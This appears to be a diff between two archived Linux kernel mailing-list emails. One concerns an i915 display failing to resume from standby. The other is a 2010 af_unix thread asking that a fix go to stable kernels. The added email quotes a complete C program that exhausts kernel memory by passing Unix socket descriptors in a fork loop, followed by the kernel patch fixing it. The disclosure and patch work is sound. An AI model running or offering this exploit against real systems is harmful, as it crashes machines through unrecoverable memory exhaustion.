@@ -1,78 +1,211 @@
 Return-Path: <linux-kernel-owner@vger.kernel.org>
 Received: (majordomo@vger.kernel.org) by vger.kernel.org via listexpand
-	id S1753835Ab0KZIpx (ORCPT <rfc822;w@1wt.eu>);
-	Fri, 26 Nov 2010 03:45:53 -0500
-Received: from mail-ww0-f44.google.com ([74.125.82.44]:45477 "EHLO
-	mail-ww0-f44.google.com" rhost-flags-OK-OK-OK-OK) by vger.kernel.org
-	with ESMTP id S1753461Ab0KZIpw (ORCPT
-	<rfc822;linux-kernel@vger.kernel.org>);
-	Fri, 26 Nov 2010 03:45:52 -0500
-DomainKey-Signature: a=rsa-sha1; c=nofws;
-        d=gmail.com; s=gamma;
-        h=date:from:to:cc:subject:message-id:mail-followup-to:references
-         :mime-version:content-type:content-disposition:in-reply-to
-         :user-agent;
-        b=AnLOI64Y2nKOhTuQFThJoChReW1tR0d2MeOOiyTGIK1ezEKA6Po1HGiVJ0IB2v9uFZ
-         ldV/hhP17QEAdMXCmUXkUHULzjTqDEFZNMic3xkqZ7BzKUkLELEMe5VxGImjgm+D7tdw
-         2FJZ8gBptLl9y50Yx3yQvbZ9qnbZpPpwQvPE4=
-Date: Fri, 26 Nov 2010 11:45:38 +0300
-From: Dan Carpenter <error27@gmail.com>
-To: Keith Packard <keithp@keithp.com>
-Cc: Nick Bowler <nbowler@elliptictech.com>, Michal Hocko <mhocko@suse.cz>,
-        "Rafael J. Wysocki" <rjw@sisk.pl>, intel-gfx@lists.freedesktop.org,
-        LKML <linux-kernel@vger.kernel.org>, dri-devel@lists.freedesktop.org
-Subject: Re: i915: display doesn't get on back after returning from standby
- in 2.6.27-rc*
-Message-ID: <20101126084538.GC12939@bicker>
-Mail-Followup-To: Dan Carpenter <error27@gmail.com>,
-	Keith Packard <keithp@keithp.com>,
-	Nick Bowler <nbowler@elliptictech.com>,
-	Michal Hocko <mhocko@suse.cz>, "Rafael J. Wysocki" <rjw@sisk.pl>,
-	intel-gfx@lists.freedesktop.org,
-	LKML <linux-kernel@vger.kernel.org>,
-	dri-devel@lists.freedesktop.org
-References: <20101123123234.GA3791@tiehlicka.suse.cz>
- <20101125155828.GC9754@tiehlicka.suse.cz>
- <20101125161058.GA5831@elliptictech.com>
- <yunr5e9qjyf.fsf@aiko.keithp.com>
+	id S1753916Ab0KZIuH (ORCPT <rfc822;w@1wt.eu>);
+	Fri, 26 Nov 2010 03:50:07 -0500
+Received: from cantor2.suse.de ([195.135.220.15]:34457 "EHLO mx2.suse.de"
+	rhost-flags-OK-OK-OK-OK) by vger.kernel.org with ESMTP
+	id S1753713Ab0KZIuF (ORCPT <rfc822;linux-kernel@vger.kernel.org>);
+	Fri, 26 Nov 2010 03:50:05 -0500
+Date: Fri, 26 Nov 2010 09:50:00 +0100
+From: Michal Hocko <mhocko@suse.cz>
+To: stable@kernel.org
+Cc: Vegard Nossum <vegard.nossum@gmail.com>,
+        David Miller <davem@davemloft.net>,
+        LKML <linux-kernel@vger.kernel.org>,
+        Andrew Morton <akpm@linux-foundation.org>,
+        Eugene Teo <eugene@redhat.com>, netdev <netdev@vger.kernel.org>,
+        Eric Dumazet <eric.dumazet@gmail.com>
+Subject: Re: [PATCH] af_unix: limit unix_tot_inflight
+Message-ID: <20101126085000.GA4532@tiehlicka.suse.cz>
+References: <AANLkTi=Q967xpX0KLMwX-=_4_1AKO5wjHEuJ1TrNjCj9@mail.gmail.com>
+ <1290553918.2866.80.camel@edumazet-laptop>
+ <1290590335.3464.24.camel@edumazet-laptop>
 MIME-Version: 1.0
 Content-Type: text/plain; charset=us-ascii
 Content-Disposition: inline
-In-Reply-To: <yunr5e9qjyf.fsf@aiko.keithp.com>
+In-Reply-To: <1290590335.3464.24.camel@edumazet-laptop>
 User-Agent: Mutt/1.5.20 (2009-06-14)
 Sender: linux-kernel-owner@vger.kernel.org
 List-ID: <linux-kernel.vger.kernel.org>
 X-Mailing-List: linux-kernel@vger.kernel.org
 
-On Thu, Nov 25, 2010 at 11:31:04AM -0800, Keith Packard wrote:
-> On Thu, 25 Nov 2010 11:10:58 -0500, Nick Bowler <nbowler@elliptictech.com> wrote:
-> > On 2010-11-25 16:58 +0100, Michal Hocko wrote:
-> > > [Let's add Rafael for regression tracking]
+Shouldn't this go to stable?
+AFAICS 2.6.32 contains the same code (the patch applies). 
+I haven't tried to reproduce the issue yet.
+
+On Wed 24-11-10 10:18:55, Eric Dumazet wrote:
+> Le mercredi 24 novembre 2010 ?? 00:11 +0100, Eric Dumazet a ??crit :
+> > Le mardi 23 novembre 2010 ?? 23:21 +0100, Vegard Nossum a ??crit :
+> > > Hi,
 > > > 
-> > > On Tue 23-11-10 13:32:34, Michal Hocko wrote:
-> > > > Hi,
-> > > > since early 2.6.37 (I haven't bisected when exactly) my screen doesn't
-> > > > get on after it got into standby mode. I have to either change to a
-> > > > text console and back (if it gets to standby by the screen saver) or
-> > > > close the lid on my laptop if I try:
-> > > > xset dpms force standby
-> > [...]
-> > > > Is this a known issue?
-> > 
-> > I suspect that all of the following are the same issue:
-> > 
-> >   https://bugzilla.kernel.org/show_bug.cgi?id=23122
-> >   https://bugzilla.kernel.org/show_bug.cgi?id=23472
-> >   https://bugs.freedesktop.org/show_bug.cgi?id=31803
+> > > I found this program lying around on my laptop. It kills my box
+> > > (2.6.35) instantly by consuming a lot of memory (allocated by the
+> > > kernel, so the process doesn't get killed by the OOM killer). As far
+> > > as I can tell, the memory isn't being freed when the program exits
+> > > either. Maybe it will eventually get cleaned up the UNIX socket
+> > > garbage collector thing, but in that case it doesn't get called
+> > > quickly enough to save my machine at least.
+> > > 
+> > > #include <sys/mount.h>
+> > > #include <sys/socket.h>
+> > > #include <sys/un.h>
+> > > #include <sys/wait.h>
+> > > 
+> > > #include <errno.h>
+> > > #include <fcntl.h>
+> > > #include <stdio.h>
+> > > #include <stdlib.h>
+> > > #include <string.h>
+> > > #include <unistd.h>
+> > > 
+> > > static int send_fd(int unix_fd, int fd)
+> > > {
+> > >         struct msghdr msgh;
+> > >         struct cmsghdr *cmsg;
+> > >         char buf[CMSG_SPACE(sizeof(fd))];
+> > > 
+> > >         memset(&msgh, 0, sizeof(msgh));
+> > > 
+> > >         memset(buf, 0, sizeof(buf));
+> > >         msgh.msg_control = buf;
+> > >         msgh.msg_controllen = sizeof(buf);
+> > > 
+> > >         cmsg = CMSG_FIRSTHDR(&msgh);
+> > >         cmsg->cmsg_len = CMSG_LEN(sizeof(fd));
+> > >         cmsg->cmsg_level = SOL_SOCKET;
+> > >         cmsg->cmsg_type = SCM_RIGHTS;
+> > > 
+> > >         msgh.msg_controllen = cmsg->cmsg_len;
+> > > 
+> > >         memcpy(CMSG_DATA(cmsg), &fd, sizeof(fd));
+> > >         return sendmsg(unix_fd, &msgh, 0);
+> > > }
+> > > 
+> > > int main(int argc, char *argv[])
+> > > {
+> > >         while (1) {
+> > >                 pid_t child;
+> > > 
+> > >                 child = fork();
+> > >                 if (child == -1)
+> > >                         exit(EXIT_FAILURE);
+> > > 
+> > >                 if (child == 0) {
+> > >                         int fd[2];
+> > >                         int i;
+> > > 
+> > >                         if (socketpair(PF_UNIX, SOCK_SEQPACKET, 0, fd) == -1)
+> > >                                 goto out_error;
+> > > 
+> > >                         for (i = 0; i < 100; ++i) {
+> > >                                 if (send_fd(fd[0], fd[0]) == -1)
+> > >                                         goto out_error;
+> > > 
+> > >                                 if (send_fd(fd[1], fd[1]) == -1)
+> > >                                         goto out_error;
+> > >                         }
+> > > 
+> > >                         close(fd[0]);
+> > >                         close(fd[1]);
+> > >                         goto out;
+> > > 
+> > >                 out_error:
+> > >                         fprintf(stderr, "error: %s\n", strerror(errno));
+> > >                 out:
+> > >                         exit(EXIT_SUCCESS);
+> > >                 }
+> > > 
+> > >                 while (1) {
+> > >                         pid_t kid;
+> > >                         int status;
+> > > 
+> > >                         kid = wait(&status);
+> > >                         if (kid == -1) {
+> > >                                 if (errno == ECHILD)
+> > >                                         break;
+> > >                                 if (errno == EINTR)
+> > >                                         continue;
+> > > 
+> > >                                 exit(EXIT_FAILURE);
+> > >                         }
+> > > 
+> > >                         if (WIFEXITED(status)) {
+> > >                                 if (WEXITSTATUS(status))
+> > >                                         exit(WEXITSTATUS(status));
+> > >                                 break;
+> > >                         }
+> > >                 }
+> > >         }
+> > > 
+> > >         return EXIT_SUCCESS;
+> > > }
+> > > 
+> > > 
+> > > Vegard
+> > > --
 > 
-> I've provided a couple of fixes that might be relevant here -- neither
-> kernel nor user mode were setting the tracked DPMS state of the outputs
-> to ON when doing mode setting, which caused all kinds of comedy. These
-> should fix 23472 and 31803. I'm not entirely sure what's up with 23122,
-> but it's possible that it's the same issue.
+> Here is a patch to address this problem.
 > 
+> Thanks
+> 
+> [PATCH] af_unix: limit unix_tot_inflight
+> 
+> Vegard Nossum found a unix socket OOM was possible, posting an exploit
+> program.
+> 
+> My analysis is we can eat all LOWMEM memory before unix_gc() being
+> called from unix_release_sock(). Moreover, the thread blocked in
+> unix_gc() can consume huge amount of time to perform cleanup because of
+> huge working set.
+> 
+> One way to handle this is to have a sensible limit on unix_tot_inflight,
+> tested from wait_for_unix_gc() and to force a call to unix_gc() if this
+> limit is hit.
+> 
+> This solves the OOM and also reduce overall latencies, and should not
+> slowdown normal workloads.
+> 
+> Reported-by: Vegard Nossum <vegard.nossum@gmail.com>
+> Signed-off-by: Eric Dumazet <eric.dumazet@gmail.com>
+> Cc: Andrew Morton <akpm@linux-foundation.org>
+> Cc: Eugene Teo <eugene@redhat.com>
+> ---
+>  net/unix/garbage.c |    7 +++++++
+>  1 files changed, 7 insertions(+)
+> 
+> diff --git a/net/unix/garbage.c b/net/unix/garbage.c
+> index c8df6fd..40df93d 100644
+> --- a/net/unix/garbage.c
+> +++ b/net/unix/garbage.c
+> @@ -259,9 +259,16 @@ static void inc_inflight_move_tail(struct unix_sock *u)
+>  }
+>  
+>  static bool gc_in_progress = false;
+> +#define UNIX_INFLIGHT_TRIGGER_GC 16000
+>  
+>  void wait_for_unix_gc(void)
+>  {
+> +	/*
+> +	 * If number of inflight sockets is insane,
+> +	 * force a garbage collect right now.
+> +	 */
+> +	if (unix_tot_inflight > UNIX_INFLIGHT_TRIGGER_GC && !gc_in_progress)
+> +		unix_gc();
+>  	wait_event(unix_gc_wait, gc_in_progress == false);
+>  }
+>  
+> 
+> 
+> --
+> To unsubscribe from this list: send the line "unsubscribe linux-kernel" in
+> the body of a message to majordomo@vger.kernel.org
+> More majordomo info at  http://vger.kernel.org/majordomo-info.html
+> Please read the FAQ at  http://www.tux.org/lkml/
 
-Where are the patches?  I pulled drm-next but I don't see them.
-
-regards,
-dan carpenter
+-- 
+Michal Hocko
+L3 team 
+SUSE LINUX s.r.o.
+Lihovarska 1060/12
+190 00 Praha 9    
+Czech Republic
